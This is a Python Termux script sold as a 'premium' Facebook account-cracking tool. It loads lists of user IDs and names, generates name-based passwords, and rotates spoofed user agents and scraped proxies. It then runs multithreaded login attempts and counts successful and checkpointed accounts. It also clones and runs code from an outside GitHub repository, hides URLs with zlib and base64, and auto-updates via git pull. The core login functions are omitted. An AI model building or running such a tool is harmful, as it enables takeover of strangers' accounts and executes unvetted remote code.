# Coded By TOXIC (SUPRAJ)
# Facebook: SUPRAJ SHRESTHA
# Github: SUPRAJ-8

###----------[ IMPORT MODULE ]----------###
import requests, json, os, sys, random, datetime, time, re, platform, string, bs4, zlib, base64, subprocess
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn
from concurrent.futures import ThreadPoolExecutor as tred
from bs4 import BeautifulSoup as par
from time import sleep as reconnect
from bs4 import BeautifulSoup
from bs4 import BeautifulSoup as sop
from time import time as kontol
import hashlib
import uuid

def check_permission():
    if not os.path.exists('/data/data/com.termux/files/home/storage'):
        print(f" Permission to access storage is required.")
        print(f" Please grant storage permission.")
        result = subprocess.run(['termux-storage-get'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        if result.returncode != 0:
            print("Failed to get permission. Exiting.")
            sys.exit(1)
        else:
            print("Permission granted.")
            return True
    else:
        return True

file_path = "/sdcard/KING-Gmail-ids-with-Cookies.txt"

try:
    if not os.path.exists(file_path):
        open(file_path, 'w').close()
except Exception as e:
    pass

try:
    with open(file_path, 'r') as f:
        content = f.read()
except Exception as e:
    pass

# Example usage
id, id2, uid = [], [], []
ses = requests.Session()
xbz, xnxx = [], []
tokenefb = []
akunyeh = []
free = []
prem = []
loop, baz = 0, []
ok, cp, oo = 0, 0, []
ualu, ualuh = [], []
pwpluss, pwnya = [], []
tokenku = []
id, id2, uid = [], [], []
tokene, akune = [], []
sandine, sandina = [], []
method, ugen = [], []

# King script
sys.stdout.write('\x1b]2; (TOXIC Tools) \x07')

try:
    prox = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=10000&country=all&ssl=all&anonymity=all').text
    open('.proxy.txt', 'w').write(prox)
except Exception as e:
    print(' error')

def unoxd():
    versi_android = str(random.randint(4, 12))
    versi_chrome = str(random.randint(85, 105)) + ".0." + str(random.randint(4200, 4900)) + "." + str(random.randint(40, 150))
    model_device = subprocess.check_output("getprop ro.product.model", shell=True).decode("utf-8").replace("\n", "")
    build_device = subprocess.check_output("getprop ro.build.id", shell=True).decode("utf-8").replace("\n", "")
    ugent = f"Mozilla/5.0 (Linux; Android {versi_android}; {str(model_device)} Build/{str(build_device)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{versi_chrome} Mobile Safari/537.36"
    return ugent

realme = random.choice(["RMX2072", "RMX2086", "RMX3350"])
ugen0 = []

def random_user_agent():
    platforms = ["X11; Linux x86_64", "Windows NT 10.0; Win64; x64", "Macintosh; Intel Mac OS X 10_15_7", "Android 11; Mobile"]
    browsers = ["Chrome/132.0.0.0", "Firefox/121.0", "Edge/119.0.0.0", "Safari/537.36"]
    base = "Mozilla/5.0 ({}) AppleWebKit/537.36 (KHTML, like Gecko) {} Safari/537.36"
    platform = random.choice(platforms)
    browser = random.choice(browsers)
    return base.format(platform, browser)

for Xr in range(10000):
    a = 'Mozilla/5.0 (Linux; Android'
    b = random.randrange(1, 9)
    c = random.randrange(1, 9)
    d = 'Build/'
    e = random.choice(["MMB29T", "JZO54K", "M1AJQ", "KOT49H"])
    f = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    g = random.randrange(73, 112)
    h = '0'
    i = random.randrange(4200, 4900)
    j = random.randrange(40, 150)
    k = 'Mobile Safari/534.36'
    l = random.choice(["UCBrowser", "VenusBrowser", "HiBrowser", "HeadlessChrome", "PaleMoon", "OPR", "Edge"])
    m = random.randrange(1, 9)
    n = random.randrange(1, 9)
    o = '0'
    p = random.randrange(5, 20)
    uaku = (f'{a} {b}.{c}; {realme}) {d}{e}; wv) {f}{g}.{h}.{i}.{j} {k} {l}/{m}.{n}.{o}.{p}')
    ugen0.append(uaku)

countrycheck = requests.get("http://ip-api.com/json/").json()["country"]
linx = zlib.decompress(b'x^\x05\xc1A\x0b\x83 \x14\x00\xe0\x7f\xb3c\x8e@\x9f\x061\x84\x1a\x1d\xd6\xa1]\xb6v\x11W\x0f\rZ\x8a\xbeF\xfb\xf7\xfb>O\x14s\xc5\x98\x8dKA\xb8\xa2K\xf6S\x84\xe4\xd8;\x10\x80<sUJ\x05\x95\xd6ms\xdb\x83\xe9~\xc7s\xbc\x8bfB\x0f{,\xbf\xc3\xfa0\x94\xf0\xfa\x1a5\xcb\xb8\xcd=\xe6l\x1d^&o\xc9,s-\xa4\x10\x9cs\t\xeaDxP\xfd\x07AM%2').decode()

###----------[ USER AGENT PREM ]----------###
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
A = '\x1b[1;90m'
BN = '\x1b[1;107m'
BBL = '\x1b[1;106m'
BP = '\x1b[1;105m'
BB = '\x1b[1;104m'
BK = '\x1b[1;103m'
BH = '\x1b[1;102m'
BM = '\x1b[1;101m'
BA = '\x1b[1;100m'
GREEN = '\x1b[38;5;46m'
RED = '\x1b[38;5;196m'
WHITE = '\033[1;97m'
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
BLACK = "\033[1;30m"
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m'  # DEFAULT
m = '\x1b[1;91m'  # RED +
k = '\033[93m'  # KUNING +
h = '\x1b[1;92m'  # HIJAU +
hh = '\033[32m'  # HIJAU -
u = '\033[95m'  # UNGU
kk = '\033[33m'  # KUNING -
b = '\33[1;96m'  # BIRU -
p = '\x1b[0;34m'  # BIRU +
mer = '\033[1;31m'
kun = '\033[1;33m'
hijo = '\033[1;32m'
biru = '\033[1;34m'
ung = '\033[1;35m'
puti = '\033[1;37m'
bira = '\033[1;36m'
xxx = '\33[m'
gen = f' {K}[{GREEN}√{K}] {P}'
dot = f' {K}[{GREEN}•{K}] {P}'
rdd = f' {K}[{RED}•{K}] {P}'
rgen = f' {K}[{RED}√{K}] {P}'
rgn = f' {K}[{K}√{K}] {P}'
method = []
limitt = f'{dot}{K}[{H}5000{M}={H}10000{M}={H}15000{M}={H}20000{M}={H}50000{K}]{K}'
c8 = f'{dot}Bd +88 [{H}017{M}={H}019{M}={H}016{M}={H}013{M}={H}018{M}={H}014{M}={H}015{P}]'
c7 = f'{dot}Bd +88 [{H}0170{M}={H}0196{M}={H}0160{M}={H}0130{M}={H}0181{M}={H}0140{P}]'
c6 = f'{dot}[{H}01770{M}={H}01996{M}={H}01601{M}={H}01301{M}={H}01881{M}={H}01401{P}]'
i8 = f'{dot}India +91 [{H}99{M}={H}98{M}={H}78{M}={H}93{M}={H}74{M}={H}63{M}={H}95{P}]'
i7 = f'{dot}india +91 [{H}639{M}={H}742{M}={H}957{M}={H}786{M}={H}905{M}={H}758{M}={H}764{P}]'
led = f'{B} -{H}-{M}-{K}-{A}-{B}-{N}-{H}-{P}-{N}-{B}-{H}-{M}-{U}-{K}-{B}-{O}-{H}-{P}-{M}-{B}-{H}-{M}-{K}-{A}-{B}-{N}-{H}-{P}-{N}-{B}-{K}-{H}-{M}-{U}-{K}-{B}-{O}-{H}-{P}{M}-{B}'
gfirst = f'{dot}[{H}Mahin{M}={H}Sabbir{M}={H}Jonysing{M}={H}mamun{P}]'
glast = f'{dot}[{H}Ahmed{M}={H}islam{M}={H}hasan{M}={H}kumar{P}]'
my_color = [P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
crzy = [B, RED, GREEN, P, K, U, O, N]
warn = random.choice(crzy)
ugenn = []
apxx = []
uakpl = []
gxmxl = []
vsn = "6.0"

def banner2():
    os.system('clear')
    print(f"""{H}    \033[1;91m_____ _____  _____ ____ 
 \033[1;92m|_   _/ _ \ \/ |_ _/ ___|
 \033[1;93m  | || | | \  / | | |    
 \033[1;94m  | || |_| /  \ | | |___ 
 \033[1;95m  |_| \___/_/\_|___\____|VERSION:\u001b[36m V6\033[1;37m                                             
{RED}╔════════════════════════════════════════╗
{GREEN}║{K}[{H}•{K}] {P}Author  {RED}  :{H} FB-KING                 {GREEN}║
{GREEN}║{K}[{H}•{K}] {P}Facebook {RED} : {H}Mahin Ahmed             {GREEN}║
{GREEN}║{K}[{H}•{K}] {P}Whatsapp  {RED}: {H}+8801841004250          {GREEN}║
{GREEN}║{K}[{H}•{K}] {P}Github   {RED} : {H}github.com/FB-KING    {GREEN}  ║
{GREEN}║{K}[{H}•{K}] {P}Status    {RED}: {H}Premium      {GREEN}           ║
{GREEN}║{K}[{H}•{K}] {P}Network  {RED} : {RED}({H}3G{M}/{H}4G{M}/{H}5G{RED}) {H}ON{GREEN} {RED}({H}Wifi{RED})  {GREEN}  ║
{GREEN}║{K}[{H}•{K}] {P}Version{RED}   : {H}{vsn} {GREEN}                  ║
{GREEN}║{K}[{H}•{K}] {P}Tools   {RED}  : {H}{H}KING{RED}-{H}PRO      {GREEN}          ║
{RED}╚════════════════════════════════════════╝ {P}
 {K}[{H}√{K}]{P} This Is Premium Tools{RED}/{P}Command 
 {K}[{H}√{K}]{P}     {H} Enjoy {warna}KING-PRO{N}{H} User 
 {K}[{H}√{K}]{P} Successfully Update Done {H}{vsn}{P}""")
    print(led)

def banner():
    if "linux" in sys.platform.lower():
        try:
            os.system("clear")
        except:
            pass
    elif "win" in sys.platform.lower():
        try:
            os.system("cls")
        except:
            pass
    else:
        try:
            os.system("clear")
        except:
            pass
    print(f"""{H}   \033[1;91m_____ _____  _____ ____ 
 \033[1;92m|_   _/ _ \ \/ |_ _/ ___|
 \033[1;93m  | || | | \  / | | |    
 \033[1;94m  | || |_| /  \ | | |___ 
 \033[1;95m  |_| \___/_/\_|___\____|VERSION:\u001b[36m V6\033[1;37m                                             
{RED}╔════════════════════════════════════════╗
{GREEN}║{K}[{H}•{K}] {P}Author  {RED}  :{H} TOXIC                        {GREEN}║
{GREEN}║{K}[{H}•{K}] {P}Facebook {RED} : {H}Supraj Shrestha         {GREEN}║
{GREEN}║{K}[{H}•{K}] {P}Whatsapp  {RED}: {H}+9779819751146          {GREEN}║
{GREEN}║{K}[{H}•{K}] {P}Github   {RED} : {H}github.com/SUPRAJ-8   {GREEN}  ║
{GREEN}║{K}[{H}•{K}] {P}Status    {RED}: {H}Premium      {GREEN}           ║
{GREEN}║{K}[{H}•{K}] {P}Network  {RED} : {RED}({H}3G{M}/{H}4G{M}/{H}5G{RED}) {H}ON{GREEN} {RED}({H}Wifi{RED})  {GREEN}  ║
{GREEN}║{K}[{H}•{K}] {P}Version{RED}   : {H}{vsn}{H} ‌‌‌‍• {GREEN}                  ║
{GREEN}║{K}[{H}•{K}] {P}Tools   {RED}  : {H}{H}TOXIC{RED}-{H}PRO     {GREEN}          ║
{RED}╚════════════════════════════════════════╝ {P}
 {K}[{H}√{K}]{P} This Is Premium Tools{RED}/{P}Command 
 {K}[{H}√{K}]{P}     {H} Enjoy {warna}TOXIC{N}{H} User 
 {K}[{H}√{K}]{P} Successfully Update Done {H}{vsn}{P}""")
    print(led)
    print(f'{gen}Key {RED}: {A}{BN}{mpm}{N}')
    print(led)

cxp = 'c' + 'o' + 'n' + 't' + 'r' + 'o' + 'l' + 'e' + 'x' + 'x' + 'p'
mpk = 'o' + 'g' + 's' + 'p' + 'o' + 't'
mxp = 'b' + 'l' + mpk
dtc = '2023'
xzn = "0" + "1" + "8" + "4" + "1" + "0" + "0"
xdnm = xzn + "4" + "2" + "5" + "0"
cokix = []
uuidd = str(os.geteuid()) + str(os.getlogin()) + str(os.getuid())
idp = "".join(uuidd).replace("_", "").replace("360", "AHS").replace("u", "9").replace("a", "A")
plat = platform.version()[14:][:21][::-1].upper() + platform.release()[5:][::-1].upper() + platform.version()[:8]
xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')
bxd = ""
bumper = f'{idp}{xp}'
mpm = idp + '|TOXIC-PRO|' + xp[:5]
autock = idp + '|TOXIC-PRO|' + xp[:5]
sndxx = base64.b64decode(b'aHR0cHM6Ly93YS5tZS8rODgwMTg0MTAwNDI1MD90ZXh0PQ==')
xsbxd = sndxx.decode("ASCII")

# Function to run shell commands
def run_command(command):
    banner()
    print(f"{dot}Running{M} :{my_color} {command}{P}")
    subprocess.run(command, shell=True)

def setup_and_run():
    run_command("rm -rf FILEMAKING")
    run_command("git clone --depth=1 https://github.com/PRINCE-BRAND/FILEMAKING")
    os.chdir("FILEMAKING")
    run_command("pip install -r requirements.txt")
    run_command("python3 FILEZ.py")

try:
    amsg = par(requests.get(zlib.decompress(b'x^\xcb())(\xb6\xd2\xd7/\xd5+\xc9\xd7\xf720\x8e\xf4\x0c\x04\x00B5\x06!'), verify=True).text, 'html.parser')
except Exception as e:
    print(e)
    print(f'{rgen}Check Your Internet..')
    exit()

for xt3x in amsg.find_all('div', class_='post-body entry-content float-container'):
    zyx = xt3x.text
announce = zyx.strip()

def firstck():
    pass

import os
numberd = '8801841004250'
file_name = ".name.txt"
if os.path.exists(file_name):
    with open(file_name, "r") as f:
        saved_name = f.read().strip()
    banner()
    print(f"{dot}Welcome back {M}: {H}{saved_name}{P}{M}!")
    time.sleep(4)
else:
    banner()
    regs = input(f'{dot} Name For registration {M}:{H} ')
    with open(file_name, "w") as f:
        f.write(regs)
    banner()
    adt = f"Hi%20FB-TOXIC%20Owner%20My%20Reg%20name%20is%20:%20{regs}"
    os.system(f'termux-open {xsbxd}{adt}')
    sys.exit()

# Key
xkey = "TOXIC=" + xp[:8]
kxd = str(xp[:8])
correct_password = xkey

try:
    model = subprocess.check_output('getprop ro.product.model', shell=True).decode('utf-8').replace('\n', '')
except:
    model = "Unknown"

kex = model + '=' + kxd[2:-2]
usrb = model + '-25800131-' + kxd[2:-2]
usrm = model + '-13175669-' + kxd[2:-2]
usrd = model + '-36507569-' + kxd[2:-2]

def keyck():
    pass

def passkey(mht):
    pass

# PUBLIC CLONE SYSTEM START LINES
def loginkey(mht):
    pass

def cserver():
    pass

def buy():
    pass

# PUBLIC CLONE SYSTEM END
def hack(mht):
    firstck()
    cserver()
    keyck()
    banner()
    print(f"{K} [{H}1{K}] {WHITE}Public File Make {RED}[{H}New{RED}]{P} ")
    print(f"{K} [{H}2{K}] {WHITE}Public Clone     {RED}[{H}FF{RED}]{P} ")
    print(f"{K} [{H}3{K}] {WHITE}File Clone       {RED}[{H}V4{RED}]{P}")
    print(f"{K} [{H}4{K}] {WHITE}Random Clone     {RED}[{H}New{RED}]{P}")
    print(f"{K} [{H}5{K}] {WHITE}Report Problem   {RED}[{H}Send{RED}]{P} ")
    print(f"{K} [{H}0{K}] {WHITE}Exit Program     {RED}[{H}Tools{RED}]{P} ")
    print(led)
    mahin = input(f'{dot}Select menu {M}:{H} ')
    os.system(f'termux-open https://www.facebook.com/groups/king.official.bd/?ref=share&mibextid=NSMWBT')
    if mahin in ["1", "01"]:
        setup_and_run()
    elif mahin in ["2", "02"]:
        exit()
    elif mahin in ["3", "03"]:
        flcln(mahin)
    elif mahin in ["4", "04"]:
        brndm(mht)
    elif mahin in ["5", "05"]:
        os.system('xdg-open https://www.facebook.com/share/1DxPN2Dpf8/')
        os.system('xdg-open https://wa.me/8801841004250')
        exit()
    elif mahin in ["0", "00"]:
        exit()
    else:
        os.system('termux-open https://www.facebook.com/groups/king.official.bd/?ref=share&mibextid=NSMWBT')
        exit()

def brndm(mht):
    banner()
    print(f"{K} [{H}1{K}] {WHITE}Random  {M}[{H}8-Digit{M}]{P} ")
    print(f"{K} [{H}2{K}] {WHITE}Random  {M}[{H}7-Digit{M}]{P} ")
    print(f"{K} [{H}3{K}] {WHITE}Random  {M}[{H}6-Digit{M}]{P}")
    print(f"{K} [{H}4{K}] {WHITE}Random  {M}[{H}Gmail{M}]{P}")
    print(f"{K} [{H}5{K}] {WHITE}Back To {M}[{H}Home{M}]{P}")
    print(f"{K} [{H}6{K}] {WHITE}Exit Tools {P} ")
    print(led)
    mahin = input(f'{dot}Select menu {M}:{H} ')
    if mahin in ["1", "01"]:
        rd8(mht)
    elif mahin in ["2", "02"]:
        rd7(mht)
    elif mahin in ["3", "03"]:
        rd6(mht)
    elif mahin in ["4", "04"]:
        xmilg(mahin)
    elif mahin in ["5", "05"]:
        hack(mht)
    elif mahin in ["6", "06"]:
        os.system('clear')
        exit()
    else:
        exit()

# METHOD X COOKIES X APPLICATION
rlist = []

def flcln(mahin):
    banner()
    keyck()
    gxmxl.append('File')
    
    try:
        # Prompt the user to input the file path
        fileX = input(f"{dot}Input File Path {RED}:{H} ")
        
        # Read the file and process each line
        with open(fileX, 'r') as f:
            for line in f:
                id.append(line.strip())
        
        banner()
        cserver()
        
        # Ask if the user wants to show cookies
        cokixx = input(f'{dot}Cloning Show Cookie  {M}?{P} [{H}Y{P}/{K}N{P}] {M}:{H} ')
        if cokixx in ['y', 'Y', 'yes', 'Yes', '1']:
            cokix.append('y')
        
        banner()
        print(f'{K} [{H}1{K}] {P}Method ({H}M-{H}1{P}){P}')
        print(f'{K} [{H}2{K}] {P}Method ({H}M-{H}2{P}){P}')
        print(f'{K} [{H}3{K}] {P}Method ({H}M-3{H}{P}){P}')
        print(f'{K} [{H}4{K}] {P}Method ({H}New{P}){P}')
        print(led)
        
        hxc = input(f'{dot}Choose {RED}: {H}')
        if hxc in ['1', '01']:
            method.append('m1')
        elif hxc in ['2', '02']:
            method.append('m2')
        elif hxc in ['3', '03']:
            method.append('m3')
        else:
            method.append('m4')
        
        banner()
        print(f'{K} [{H}1{K}] {P}Password ({H}Choose{P}){P}')
        print(f'{K} [{H}2{K}] {P}Password ({H}Auto{P}){P}')
        print(led)
        
        mahinpass = input(f'{dot}Choose {RED}: {H}')
        if mahinpass in ['1', '01']:
            banner()
            try:
                ps_limit = int(input(f'{dot}Password Limit {N}({H}1-30{N}){M} :{H} '))
            except:
                ps_limit = 1
            
            banner()
            print(f'{dot}{H}first,last,first last,first1234,last123,names{P}')
            print(led)
            
            for i in range(ps_limit):
                rlist.append(input(f'{gen}Put Pass {GREEN}{i+1}{RED} :{H} '))
            
            with tred(max_workers=30) as sendxd:
                banner()
                os.system("clear")
                banner()
                print(f'{N}{dot}File ids{RED}  : {H}' + str(len(id)))
                print(f'{N}{dot}Method {RED}   : {H}' + hxc)
                print(f'{N}{dot}Airplane Mode On Off For More {RED}({warna}ids{RED}){N}')
                print(led)
                
                for kingxpro in id:
                    idf, names = kingxpro.split('|')
                    pwv = rlist
                    if 'm1' in method:
                        sendxd.submit(filem1, idf, pwv, names)
                    elif 'm2' in method:
                        sendxd.submit(filem2, idf, pwv, names)
                    elif 'm3' in method:
                        sendxd.submit(filem3, idf, pwv, names)
                    else:
                        sendxd.submit(filem4, idf, pwv, names)
            
            print('')
            print(f'{gen}Hi Dear User Crack process has been completed')
            print(f'{gen}Total ok {B}:{GREEN}{ok}\n{rgen}Total cp {B}: {RED}{cp} ')
            exit()
        
        elif mahinpass in ['2', '02']:
            rlist.append('first123')
            rlist.append('first12')
            rlist.append('first1234')
            rlist.append('firstlast')
            rlist.append('first last')
            rlist.append('last12')
            rlist.append('last123')
            rlist.append('last1234')
            rlist.append('First Last')
            
            with tred(max_workers=30) as sendxd:
                banner()
                os.system("clear")
                banner()
                print(f'{N}{dot}File ids{RED}  : {H}' + str(len(id)))
                print(f'{N}{dot}Method {RED}   : {H}' + hxc)
                print(f'{N}{dot}Airplane Mode On Off For More {RED}({warna}ids{RED}){N}')
                print(led)
                
                for kingxpro in id:
                    idf, names = kingxpro.split('|')
                    pwv = rlist
                    if 'm1' in method:
                        sendxd.submit(filem1, idf, pwv, names)
                    elif 'm2' in method:
                        sendxd.submit(filem2, idf, pwv, names)
                    elif 'm3' in method:
                        sendxd.submit(filem3, idf, pwv, names)
                    else:
                        sendxd.submit(filem4, idf, pwv, names)
            
            print('')
            print(f'{gen}Hi Dear User Crack process has been completed')
            print(f'{gen}Total ok {B}:{GREEN}{ok}\n{rgen}Total cp {B}: {RED}{cp} ')
            exit()
        
        else:
            banner()
            print(f'{rgen}Hello Brother something wrong')
            exit()
    
    except IOError:
        print(led)
        print(f"\nFile %s not found" % (fileX))
        exit()

# Rest of the methods (filem1, filem2, filem3, filem4, rdm1, rdm2, rdm3, rdm4) remain unchanged.

if __name__ == '__main__':
    try:
        os.system('git pull')
        mht = 'XD'
        hack(mht)
    except requests.exceptions.ConnectionError:
        banner()
        print(f'{rgen}Check Your Internet..')
        exit()
    except:
        banner()
        print(f'{rgen}Hello Brother something wrong')
        exit()
